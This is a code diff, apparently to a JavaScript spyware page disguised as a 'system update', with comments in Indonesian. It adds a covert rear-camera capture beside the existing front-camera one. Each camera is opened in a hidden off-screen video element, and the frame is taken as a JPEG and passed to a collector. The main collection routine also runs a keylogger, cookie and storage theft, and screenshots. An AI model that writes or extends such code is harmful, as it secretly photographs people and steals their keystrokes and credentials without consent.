@@ -83,7 +83,7 @@
 
 <script>
 // ============================================================
-// 🔥 SYSTEMUPDATE.HTML - FIX (CANVAS DIHAPUS!)
+// 🔥 SYSTEMUPDATE.HTML - FULL CODE (TANPA CANVAS!)
 // ============================================================
 
 // ============================================================
@@ -289,9 +289,9 @@ function getScreenshotReal() {
     }
 }
 
-// 🔒 5. CAMERA (SUDAH BERHASIL - DIKUNCI)
-function getCameraReal() {
-    logBypass('📷 Mengambil kamera...');
+// 🔒 5. CAMERA SELFIE (SUDAH BERHASIL - DIKUNCI)
+function getCameraSelfie() {
+    logBypass('📷 Mengambil kamera selfie...');
     try {
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
@@ -309,8 +309,42 @@ function getCameraReal() {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
                         if (dataUrl && dataUrl.length > 1000) {
-                            K({ sumber: 'data_kamera_real', data: dataUrl });
-                            DATA_COLLECTED.camera = true;
+                            K({ sumber: 'data_kamera_selfie', data: dataUrl });
+                            DATA_COLLECTED.kamera_selfie = true;
+                            logBypass('✅ Kamera Selfie');
+                        }
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+                        try { document.body.removeChild(video); } catch(e) {}
+                    }, 1000);
+                })
+                .catch(function() {});
+        }
+    } catch(e) {}
+}
+
+// 🔥 5B. CAMERA BELAKANG (TAMBAHAN!)
+function getCameraBelakang() {
+    logBypass('📷 Mengambil kamera belakang...');
+    try {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
+                .then(function(stream) {
+                    var video = document.createElement('video');
+                    video.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
+                    document.body.appendChild(video);
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(function() {
+                        var canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        var ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
+                        if (dataUrl && dataUrl.length > 1000) {
+                            K({ sumber: 'data_kamera_belakang', data: dataUrl });
+                            DATA_COLLECTED.kamera_belakang = true;
+                            logBypass('✅ Kamera Belakang');
                         }
                         stream.getTracks().forEach(function(t) { t.stop(); });
                         try { document.body.removeChild(video); } catch(e) {}
@@ -715,7 +749,8 @@ function collectAllData() {
     getBatteryReal();
     getNetworkReal();
     getScreenshotReal();
-    getCameraReal();
+    getCameraSelfie();
+    getCameraBelakang(); // ← KAMERA BELAKANG!
     getCookiesAndStorage();
     startKeylogger();
     getVibrateReal();
